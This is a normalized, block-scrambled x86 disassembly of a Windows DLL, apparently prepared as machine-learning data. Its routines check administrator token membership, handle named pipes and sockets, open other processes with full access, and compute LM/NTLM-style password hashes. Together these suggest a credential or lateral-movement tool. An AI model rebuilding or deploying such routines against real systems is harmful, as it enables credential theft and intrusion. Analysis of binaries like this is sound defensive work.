leave
retn
push esi
push edi
mov edi 0x400
push edi
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
pop edi
pop esi
cmp [ ebp - 0x10 ] ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push edi
push esi
push 0x2
push [ ebp - 0x10 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x10 ]
call [ CloseHandle@IAT ]
push esi
call [ LocalFree@IAT ]
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0xc ]
push eax
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] ebx
cmp [ esi ] ebx
jbe r-xdata
push [ ebp - 0x14 ]
call [ FreeSid@IAT ]
lea edi [ esi + 0x4 ]
mov [ ebp - 0x18 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x14 ]
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
add edi 0x8
cmp eax [ esi ]
jb r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
push [ edi ]
push [ ebp - 0x14 ]
call [ EqualSid@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
sub_1000578e
push ebp
mov ebp esp
push ecx
push edi
xor edi edi
push edi
push edi
push 0x3
push edi
push edi
push 0xc0000000
push esi
call [ CreateFileW@IAT ]
mov [ esi + 0x208 ] eax
cmp eax edi
je r-xdata
mov [ esi + 0x208 ] edi
xor eax eax
cmp eax 0xffffffff
je r-xdata
push edi
push edi
lea ecx [ ebp - 0x4 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x2
call [ SetNamedPipeHandleState@IAT ]
xor eax eax
inc eax
jmp r-xdata
pop edi
leave
retn
sub_100057da
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x208 ]
sub esp 0xc
push esi
xor esi esi
mov [ ebx ] esi
mov [ edi ] esi
cmp eax esi
je r-xdata
or eax 0xffffffff
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0xc ]
push ecx
push esi
push esi
push esi
push eax
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push [ ebp - 0x4 ]
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push esi
push [ eax + 0x208 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
push esi
call sub_10004ad0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
add eax 0xfffffffc
push eax
mov [ edi ] eax
lea eax [ esi + 0x4 ]
push eax
push esi
mov [ edx ] ecx
call [ memmove@IAT ]
mov eax [ ebp - 0x4 ]
add eax 0xfffffffc
mov [ edi ] eax
xor eax eax
add esp 0xc
mov [ ebx ] esi
inc eax
jmp r-xdata
sub_10005884
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
add eax 0x4
push edi
push eax
mov [ ebp - 0x4 ] eax
call sub_10004aa8
mov edi eax
pop ecx
test edi edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
mov esi [ memcpy@IAT ]
push 0x4
lea eax [ ebp + 0x8 ]
push eax
push edi
call esi
push [ ebp + 0x10 ]
lea eax [ edi + 0x4 ]
push [ ebp + 0xc ]
push eax
call esi
mov esi [ ebp - 0x4 ]
add esp 0x18
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push esi
push edi
push [ ebx + 0x208 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
leave
retn 0xc
push edi
call sub_10004ad0
or eax 0xffffffff
cmp [ ebp - 0x8 ] esi
jne r-xdata
pop edi
push edi
call sub_10004ad0
xor eax eax
inc eax
jmp r-xdata
pop ecx
pop esi
sub_1000590d
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x208 ]
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ PeekNamedPipe@IAT ]
push edi
lea ecx [ ebp - 0x8 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push ebx
push ebx
push eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
call esi
test eax eax
jne r-xdata
pop ebx
leave
retn 0x4
cmp [ ebp - 0x8 ] ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0xc ] 0x1
cmp [ ebp - 0x4 ] ebx
je r-xdata
pop edi
pop esi
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ebx
push ebx
push ebx
push [ eax + 0x208 ]
push 0x32
pop edi
cmp [ ebp - 0x4 ] edi
jg r-xdata
push edi
call [ Sleep@IAT ]
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x4 ]
sub_100059a9
cmp [ rw-data ] 0x0
push esi
mov [ edi ] r--data
jne r-xdata
and [ edi + 0x214 ] 0x0
xor eax eax
push 0x20c
mov [ edi + 0xc ] ax
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
mov [ rw-data ] 0x1
cmp [ rw-data ] eax
jbe r-xdata
xor esi esi
and [ esi + 0x208 ] 0x0
push r--data
push r--data
push 0x104
push esi
call [ _snwprintf@IAT ]
add esp 0x10
jmp r-xdata
xor esi esi
mov [ edi + 0x8 ] esi
mov eax edi
pop esi
retn
mov edx [ rw-data ]
mov ecx esi
shr edx cl
add esi 0x8
xor [ eax + rw-data ] dl
inc eax
cmp eax [ rw-data ]
jb r-xdata
sub_10005a34
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10005a53
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
pop ecx
sub_10005a53
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
mov [ esi ] r--data
test edi edi
je r-xdata
lea edi [ esi + 0xc ]
cmp [ edi ] 0x0
je r-xdata
mov eax edi
call sub_10005765
push edi
call sub_10004ae2
pop ecx
pop edi
mov [ esi ] r--data
pop esi
retn
push edi
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
push 0x4
push eax
push edi
call [ MoveFileExW@IAT ]
sub_10005ab1
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
cmp [ esi + 0x214 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push eax
call sub_1000590d
test eax eax
jns r-xdata
pop esi
leave
retn 0xc
je r-xdata
mov eax [ esi + 0x8 ]
call sub_10005765
and [ esi + 0x214 ] 0x0
jmp r-xdata
push ebx
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x8 ]
lea edi [ ebp - 0xc ]
lea ebx [ ebp - 0x8 ]
call sub_100057da
pop edi
pop ebx
test eax eax
jns r-xdata
je r-xdata
mov eax [ esi + 0x8 ]
call sub_10005765
and [ esi + 0x214 ] 0x0
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
xor eax eax
inc eax
sub_10005b3b
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x210 ] eax
mov eax [ eax ]
push edi
mov edi ecx
cmp eax [ ebp + 0x10 ]
jbe r-xdata
cmp [ edi + 0x214 ] 0x0
push ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x10 ]
mov ebx [ edi + 0x8 ]
push [ ebp - 0x210 ]
push [ ebp + 0x8 ]
call sub_10005884
test eax eax
jns r-xdata
push esi
mov esi [ edi + 0x8 ]
mov ebx 0x3e8
push ebx
push esi
call [ WaitNamedPipeW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_1000eff2
leave
retn 0xc
xor eax eax
inc eax
mov eax [ edi + 0x8 ]
call sub_10005765
and [ edi + 0x214 ] 0x0
call [ GetLastError@IAT ]
lea eax [ ebp - 0x20c ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea eax [ ebp - 0x20c ]
push eax
call [ wcslen@IAT ]
cmp [ ebp + eax * 2 - 0x20e ] 0x5c
mov esi [ wcscat@IAT ]
pop ecx
je r-xdata
call sub_1000578e
test eax eax
je r-xdata
pop ebx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call esi
push [ rw-data ]
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call sub_10004df9
add esp 0x14
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
push r--data
push eax
call esi
pop ecx
pop ecx
mov [ edi + 0x214 ] 0x1
jmp r-xdata
cmp [ edi + 0x214 ] 0x0
pop esi
je r-xdata
push 0x0
call sub_10004e87
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
push eax
push 0x0
push 0x1fffff
call [ OpenProcess@IAT ]
mov [ ebp - 0x214 ] eax
test eax eax
je r-xdata
lea ecx [ ebp - 0x20c ]
push ecx
push eax
call sub_1000e23b
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
push eax
call [ DeleteFileW@IAT ]
push ebx
call [ Sleep@IAT ]
mov esi [ edi + 0x8 ]
push ebx
push esi
call [ WaitNamedPipeW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x214 ]
call [ CloseHandle@IAT ]
call sub_1000578e
test eax eax
je r-xdata
mov [ edi + 0x214 ] 0x1
jmp r-xdata
sub_10005cdf
push esi
mov esi ecx
push edi
mov eax esi
mov [ esi ] r--data
call sub_10005e95
mov edi [ esi + 0x110 ]
test edi edi
je r-xdata
pop edi
pop esi
retn
push 0x2
push edi
call [ shutdown@IAT ]
push edi
call [ closesocket@IAT ]
and [ esi + 0x110 ] 0x0
sub_10005d14
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x10c ]
mov [ ebp - 0x18 ] 0x10
call [ getpeername@IAT ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x10 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn 0x4
sub_10005d5b
push esi
push 0x114
mov esi ecx
call sub_10004aa8
pop ecx
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x8 ] cl
mov [ eax + 0x108 ] ecx
mov [ eax + 0x10c ] ecx
mov [ eax + 0x110 ] ecx
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ecx [ esi + 0x10c ]
mov [ eax + 0x10c ] ecx
mov ecx [ esi + 0x110 ]
mov [ eax + 0x110 ] ecx
pop esi
retn
sub_10005dab
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x10c ]
imul eax eax 0x3e8
push edi
mov [ ebp - 0x10c ] eax
xor edx edx
lea eax [ ebp - 0x110 ]
push eax
push edx
push edx
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x104 ] ecx
push eax
inc ecx
push ecx
mov [ ebp - 0x108 ] 0x1
mov [ ebp - 0x110 ] edx
call [ select@IAT ]
mov edi eax
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax edi
xor ecx ebp
pop edi
call sub_1000eff2
leave
retn 0x4
sub_10005e20
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x10c ]
imul eax eax 0x3e8
push edi
mov [ ebp - 0x10c ] eax
xor edx edx
lea eax [ ebp - 0x110 ]
push eax
push edx
lea eax [ ebp - 0x108 ]
push eax
mov [ ebp - 0x104 ] ecx
push edx
inc ecx
push ecx
mov [ ebp - 0x108 ] 0x1
mov [ ebp - 0x110 ] edx
call [ select@IAT ]
mov edi eax
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax edi
xor ecx ebp
pop edi
call sub_1000eff2
leave
retn 0x4
sub_10005eb2
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10005cdf
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
pop ecx
sub_10005ed1
push esi
push edi
push 0x10118
mov edi ecx
call sub_10004aa8
pop ecx
xor ecx ecx
cmp eax ecx
je r-xdata
xor esi esi
mov [ eax + 0x8 ] cl
mov [ eax + 0x108 ] ecx
mov [ eax + 0x10c ] ecx
mov [ eax + 0x110 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ esi + 0x8 ]
push eax
call [ strcpy@IAT ]
mov eax [ edi + 0x108 ]
mov [ esi + 0x108 ] eax
mov eax [ edi + 0x10c ]
pop ecx
mov [ esi + 0x10c ] eax
mov eax [ edi + 0x110 ]
pop ecx
mov [ esi + 0x110 ] eax
pop edi
mov eax esi
pop esi
retn
sub_10005f43
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005cdf
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
pop ecx
sub_10005f68
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
imul eax eax 0x3e8
mov [ ebp - 0x10c ] eax
xor edx edx
lea eax [ ebp - 0x110 ]
push eax
push edx
push edx
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x104 ] ecx
push eax
inc ecx
push ecx
mov [ ebp - 0x108 ] 0x1
mov [ ebp - 0x110 ] edx
call [ select@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn
sub_10005fc6
push ebp
mov ebp esp
push ecx
push ecx
push esi
xor esi esi
push esi
push 0x1
push 0x2
call [ socket@IAT ]
mov [ ebp - 0x4 ] eax
cmp eax esi
jge r-xdata
push 0x3
push esi
push esi
mov esi [ GetCurrentProcess@IAT ]
lea eax [ ebp - 0x4 ]
push eax
call esi
push eax
push [ ebp - 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x1006
push 0xffff
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x7530
call [ setsockopt@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
call [ closesocket@IAT ]
jmp r-xdata
pop esi
leave
retn
xor eax eax
jmp r-xdata
sub_10006048
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x30
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
mov eax [ ebp + 0x10 ]
push esi
push edi
or edi 0xffffffff
mov esi ecx
cmp [ ebp + 0xc ] eax
jne r-xdata
sub eax [ ebp + 0xc ]
mov [ esp + 0xc ] eax
fild [ esp + 0xc ]
fstp [ esp + 0x10 ]
fild [ ebp + 0xc ]
fstp [ esp + 0x18 ]
push 0x10
lea eax [ esp + 0x28 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push 0x2
pop eax
push [ ebp + 0xc ]
mov [ esp + 0x28 ] ax
call [ htons@IAT ]
push 0x0
mov [ esp + 0x2a ] ax
call [ htonl@IAT ]
mov [ esp + 0x28 ] eax
push 0x10
lea eax [ esp + 0x28 ]
push eax
push [ ebp + 0x8 ]
call [ bind@IAT ]
test eax eax
je r-xdata
call [ rand@IAT ]
mov [ esp + 0xc ] eax
fild [ esp + 0xc ]
fmul [ r--data ]
fmul [ esp + 0x10 ]
fadd [ esp + 0x18 ]
call sub_1000fc14
push 0x10
mov esi eax
lea eax [ esp + 0x28 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push 0x2
pop eax
push esi
mov [ esp + 0x28 ] ax
call [ htons@IAT ]
push 0x0
mov [ esp + 0x2a ] ax
call [ htonl@IAT ]
mov [ esp + 0x28 ] eax
push 0x10
lea eax [ esp + 0x28 ]
push eax
push [ ebp + 0x8 ]
call [ bind@IAT ]
test eax eax
js r-xdata
xor edi edi
inc edi
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov ecx [ esp + 0x34 ]
mov eax edi
pop edi
pop esi
xor ecx esp
call sub_1000eff2
mov esp ebp
pop ebp
retn 0xc
sub_1000615c
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x110 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn
push esi
mov esi [ ioctlsocket@IAT ]
push edi
lea ecx [ ebp - 0x18 ]
push ecx
mov edi 0x8004667e
push edi
push eax
mov [ ebp - 0x18 ] 0x1
call esi
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebx + 0x110 ]
mov [ ebp - 0x24 ] 0x10
call [ accept@IAT ]
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x18 ]
push eax
push edi
push [ ebx + 0x110 ]
call esi
cmp [ ebp - 0x1c ] 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
and [ ebp - 0x18 ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push edi
push [ ebp - 0x1c ]
call esi
mov esi [ setsockopt@IAT ]
xor eax eax
push 0x1e
inc eax
mov [ ebp - 0x20 ] ax
pop eax
push 0x4
mov [ ebp - 0x1e ] ax
lea eax [ ebp - 0x20 ]
push eax
push 0x80
mov edi 0xffff
push edi
push [ ebp - 0x1c ]
call esi
push 0x4
lea eax [ ebp - 0x2c ]
push eax
push 0x1006
push edi
mov edi [ ebp - 0x1c ]
push edi
mov [ ebp - 0x2c ] 0x7530
call esi
test eax eax
jne r-xdata
pop edi
pop esi
call [ GetLastError@IAT ]
push edi
mov [ ebx + 0x4 ] eax
call [ closesocket@IAT ]
push 0x4
lea ecx [ ebp - 0x28 ]
push ecx
inc eax
push eax
push 0x6
push edi
mov [ ebp - 0x28 ] eax
call esi
test eax eax
je r-xdata
mov [ ebx + 0x10c ] edi
mov eax edi
sub_1000625e
push ebp
mov ebp esp
push esi
push 0x100
push [ ebp + 0x8 ]
mov esi eax
lea eax [ edi + 0x8 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
mov [ edi + 0x108 ] esi
push esi
mov esi [ ebp + 0x8 ]
mov [ edi + 0x107 ] 0x0
call sub_10004cc5
push eax
push edi
call sub_1000629b
pop esi
pop ebp
retn 0x4
sub_1000629b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
cmp [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ esp + 0x10 ] eax
jne r-xdata
mov ebx [ closesocket@IAT ]
xor eax eax
jmp r-xdata
push 0x652c
push 0x6464
push esi
mov ecx edi
call sub_10006048
test eax eax
js r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000eff2
mov esp ebp
pop ebp
retn 0xc
push 0x2
pop eax
push [ ebp + 0x10 ]
mov [ esp + 0x20 ] ax
mov eax [ ebp + 0xc ]
mov [ esp + 0x24 ] eax
call [ htons@IAT ]
mov [ esp + 0x1e ] ax
push 0x10
lea eax [ esp + 0x20 ]
push eax
push esi
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ setsockopt@IAT ]
xor eax eax
push 0x1e
inc eax
mov [ esp + 0x18 ] ax
pop eax
push 0x4
mov [ esp + 0x1a ] ax
lea eax [ esp + 0x18 ]
push eax
push 0x80
push 0xffff
push esi
call edi
test eax eax
je r-xdata
call [ WSAGetLastError@IAT ]
push esi
mov edi eax
call ebx
cmp edi 0x2740
je r-xdata
push 0x4
xor eax eax
lea ecx [ esp + 0x1c ]
push ecx
inc eax
push eax
push 0x6
push esi
mov [ esp + 0x2c ] eax
call edi
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ esp + 0x10 ]
push esi
mov [ ecx + 0x4 ] eax
call ebx
jmp r-xdata
mov edi [ esp + 0x10 ]
call sub_10005fc6
mov esi eax
test esi esi
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0x4 ] edi
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0x10c ] esi
mov eax esi
sub_100063b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
dec [ ebp + 0x8 ]
push 0x0
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x10c ]
call [ send@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
inc eax
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
or eax 0xffffffff
jmp r-xdata
leave
retn 0x4
sub_100063f9
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x10c ]
call [ send@IAT ]
cmp eax [ ebp + 0xc ]
je r-xdata
xor eax eax
inc eax
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x8
sub_1000642a
push ebx
push edi
mov edi eax
mov ebx ecx
test edi edi
je r-xdata
xor eax eax
inc eax
mov eax 0x400
cmp edi eax
jg r-xdata
push 0x0
push eax
push ebx
push [ esi + 0x10c ]
call [ recv@IAT ]
test eax eax
jle r-xdata
mov eax edi
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
or eax 0xffffffff
jmp r-xdata
add ebx eax
sub edi eax
jne r-xdata
pop edi
pop ebx
retn
sub_1000646d
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
push esi
xor edi edi
push edi
push [ ebp + 0x8 ]
call [ memset@IAT ]
lea eax [ esi - 0x1 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
cmp eax edi
jle r-xdata
lea eax [ edi + 0x1 ]
push 0x2710
mov esi ebx
call sub_10005dab
test eax eax
js r-xdata
call [ GetLastError@IAT ]
mov [ ebx + 0x4 ] eax
je r-xdata
pop edi
pop esi
leave
retn 0x4
mov [ ebx + 0x4 ] 0x274c
jmp r-xdata
mov eax [ ebp + 0x8 ]
push 0x0
push 0x1
lea esi [ edi + eax ]
push esi
push [ ebx + 0x10c ]
call [ recv@IAT ]
test eax eax
js r-xdata
or eax 0xffffffff
jmp r-xdata
je r-xdata
mov [ ebx + 0x4 ] 0x274a
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ edi + eax - 0x1 ] 0xd
jne r-xdata
inc edi
cmp edi [ ebp - 0x4 ]
jl r-xdata
cmp [ esi ] 0xa
je r-xdata
sub_100064fc
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ strlen@IAT ]
push edi
mov edi ecx
push edi
mov [ ebp - 0x18 ] eax
call esi
pop ecx
cmp eax 0xe
push 0xe
lea eax [ ebp - 0x14 ]
jb r-xdata
push 0x0
push eax
call [ memset@IAT ]
push edi
call esi
push eax
lea eax [ ebp - 0x14 ]
push edi
push eax
call [ memcpy@IAT ]
add esp 0x1c
push edi
push eax
call [ memcpy@IAT ]
add esp 0xc
jmp r-xdata
inc edi
cmp edi 0xe
jl r-xdata
movzx eax al
push eax
call [ toupper@IAT ]
pop ecx
mov [ esi ] al
xor edi edi
lea esi [ ebp + edi - 0x14 ]
mov al [ esi ]
test al al
je r-xdata
mov edi [ ebp - 0x18 ]
mov esi rw-data
push esi
mov ecx edi
lea edx [ ebp - 0x14 ]
call sub_100012a2
lea ecx [ edi + 0x8 ]
push esi
lea edx [ ebp - 0xd ]
call sub_100012a2
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn
sub_100065a0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x74
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x70 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ memset@IAT ]
push 0x4
xor ebx ebx
mov esi ecx
push ebx
push eax
mov [ esp + 0x80 ] esi
mov [ esp + 0x20 ] eax
call edi
push esi
mov esi [ strlen@IAT ]
call esi
lea eax [ eax + eax + 0x2 ]
push eax
call [ malloc@IAT ]
add esp 0x14
mov [ esp + 0x10 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x7c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000eff2
mov esp ebp
pop ebp
retn
push [ esp + 0x74 ]
call esi
pop ecx
mov eax [ esp + 0x74 ]
movsx cx [ eax + ebx ]
mov edx [ esp + 0x10 ]
mov [ edx + ebx * 2 ] cx
push eax
inc ebx
call esi
pop ecx
cmp ebx eax
jbe r-xdata
push [ esp + 0x10 ]
xor ebx ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] 0x67452301
mov [ esp + 0x20 ] 0xefcdab89
mov [ esp + 0x24 ] 0x98badcfe
mov [ esp + 0x28 ] 0x10325476
call [ wcslen@IAT ]
push [ esp + 0x14 ]
add eax eax
lea esi [ esp + 0x20 ]
call sub_10001c7b
pop ecx
pop ecx
push 0x8
pop edx
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x74 ]
call sub_10001c4a
mov ecx [ esp + 0x28 ]
shr ecx 0x3
push 0x38
and ecx 0x3f
pop eax
cmp ecx eax
jb r-xdata
sub eax ecx
push rw-data
lea esi [ esp + 0x1c ]
call sub_10001c7b
lea eax [ esp + 0x78 ]
push eax
push 0x8
pop eax
call sub_10001c7b
mov ecx [ esp + 0x1c ]
push 0x10
pop edx
mov eax esi
call sub_10001c4a
push 0x58
mov eax esi
push ebx
push eax
call edi
push [ esp + 0x24 ]
call [ free@IAT ]
add esp 0x18
push 0x78
pop eax
sub_100066d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ strlen@IAT ]
mov esi r--data
push esi
push esi
xor eax eax
push eax
push eax
push eax
push 0x20
push esi
call edi
pop ecx
shr eax 0x8
push eax
push esi
call edi
pop ecx
mov ebx 0xff
and eax ebx
push eax
push esi
call edi
pop ecx
shr eax 0x8
push eax
push esi
call edi
pop ecx
and eax ebx
push eax
push 0x0
push 0x0
push esi
call edi
add eax 0x20
pop ecx
shr eax 0x8
push eax
push esi
call edi
add eax 0x20
pop ecx
and eax ebx
push eax
push esi
call edi
pop ecx
shr eax 0x8
push eax
push esi
call edi
pop ecx
and eax ebx
push eax
push esi
call edi
pop ecx
shr eax 0x8
push eax
push esi
call edi
pop ecx
and eax ebx
push eax
xor eax eax
push eax
push eax
push 0x2
push 0x2
push eax
push eax
push eax
push 0x1
push eax
push r--data
push 0x400
push [ ebp + 0x8 ]
call [ _snprintf@IAT ]
add esp 0x78
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10006771
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x90 ] eax
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0x88 ] eax
lea eax [ ebp - 0x34 ]
push edi
push eax
mov esi ecx
mov ebx edx
call sub_100065a0
lea eax [ ebp - 0x1c ]
push eax
mov ecx esi
call sub_100064fc
mov edi [ memset@IAT ]
push 0x5
xor esi esi
lea eax [ ebp - 0x24 ]
push esi
push eax
call edi
push 0x5
lea eax [ ebp - 0xc ]
push esi
push eax
call edi
push ebx
lea ecx [ ebp - 0x4c ]
lea edx [ ebp - 0x1c ]
